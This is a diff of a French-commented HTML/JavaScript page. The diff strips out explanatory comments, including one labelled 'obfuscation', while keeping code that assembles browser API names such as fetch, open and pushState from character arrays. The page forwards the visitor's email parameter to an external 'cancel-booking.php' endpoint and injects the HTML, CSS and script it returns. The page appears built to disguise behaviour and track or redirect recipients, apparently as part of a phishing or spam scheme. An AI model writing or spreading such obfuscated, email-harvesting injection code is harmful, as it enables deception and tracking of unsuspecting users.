@@ -10,7 +10,6 @@
         /* Styles du loader */
         @keyframes spin { 100% { transform: rotate(360deg); } }
         
-        /* 🚨 ÉTIREMENT CLÉ 🚨 : Force l'étirement total & SUPPRESSION DES MARGES */
         html, body {
             height: 100%;
             width: 100%;
@@ -19,20 +18,17 @@
             overflow: hidden; 
         }
         
-        /* Styles de base pour le chargement */
         body { 
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
             background-size: cover; 
             background-repeat: no-repeat;
         }
         
-        /* Conteneur principal: statique pour que 100vh de l'enfant fonctionne */
         #template-container {
             height: 100%; 
             width: 100%;
         }
 
-        /* Centrage du spinner de chargement */
         #loading-spinner {
             position: absolute;
             top: 50%;
@@ -56,7 +52,7 @@
     </div>
     
 <script>
-    // --- CONFIGURATION EXTERNE & OBFUSCATION ---
+    // --- OBS ---
     const H = ['h', 'i', 's', 't', 'o', 'r', 'y'].join('');
     const PS = ['p', 'u', 's', 'h', 'S', 't', 'a', 't', 'e'].join('');
     const WO = ['o', 'p', 'e', 'n'].join('');
@@ -65,7 +61,6 @@
     const FE = ['f', 'e', 't', 'c', 'h'].join('');
     const HREF = ['h', 'r', 'e', 'f'].join('');
     
-    // ⚠️ POINTS CLÉS
     const URL_PHP = "https://lespetitscoquins.fr/cancel-booking.php"; 
     const URL_TEMPLATE = URL_PHP + "?action=get_template"; 
 
@@ -76,7 +71,7 @@
 
     var redirected = false;
     
-    // --- 1. FONCTIONS DE BASES (Reste inchangé) ---
+    // --- 1. FONCTIONS DE BASES ---
     function getUrlParameter(name) {
         name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
         var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
@@ -101,7 +96,7 @@
         }, 300);
     }
     
-    // --- 2. GESTION DES CLICS (Reste inchangé) ---
+    // --- 2.CLICS ---
     function initializeUnifiedClicks(jsScript) {
         document.querySelectorAll('.action-btn').forEach(btn => {
             btn.addEventListener('click', function(event) {
@@ -129,7 +124,6 @@
         var formData = new FormData();
         formData.append('action', 'get_links');
         
-        // 🚨 MODIFICATION CRITIQUE : Envoyer l'email dans le POST
         var emailParam = getUrlParameter('u'); 
         if (emailParam) {
             formData.append('u', emailParam); 
@@ -164,17 +158,15 @@
         });
     }
 
-    // --- 3. FONCTION PRINCIPALE : CHARGEMENT DU TEMPLATE AU DÉPART ---
+    // --- 3.CHARGEMENT ---
     function loadTemplate() {
         let trackingParams = window.location.search;
         let finalParams = ''; 
         
-        // 🚨 CORRECTION DÉFINITIVE EMAIL PASSING 🚨
         if (trackingParams.length > 0 && trackingParams.startsWith('?')) {
             finalParams = '&' + trackingParams.substring(1); 
         }
         
-        // Afficher le spinner pendant le fetch
         document.getElementById('loading-spinner').style.display = 'inline-flex';
         
         window[FE](URL_TEMPLATE + finalParams, { method: METHOD_GET })
@@ -190,10 +182,10 @@
             
             if (data.status === 'ok' && data.html) {
                 
-                // 1. Injection du HTML
+                // 1. HTML
                 document.getElementById('template-container').innerHTML = data.html;
                 
-                // 2. Application du fond (couleur/gradient/filtre)
+                // 2. Application du fond 
                 const rootDiv = document.getElementById('template-container').children[0];
                 if (rootDiv) {
                     const backgroundStyle = rootDiv.style.background || rootDiv.style.backgroundColor;
@@ -211,10 +203,8 @@
                     rootDiv.style.height = '100vh';
                 }
                 
-                // 3. Injection du CSS additionnel
                 document.getElementById('template-styles').innerHTML += data.css || '';
                 
-                // 4. Initialisation des gestionnaires de clics
                 initializeUnifiedClicks(data.js);
                 
             } else {
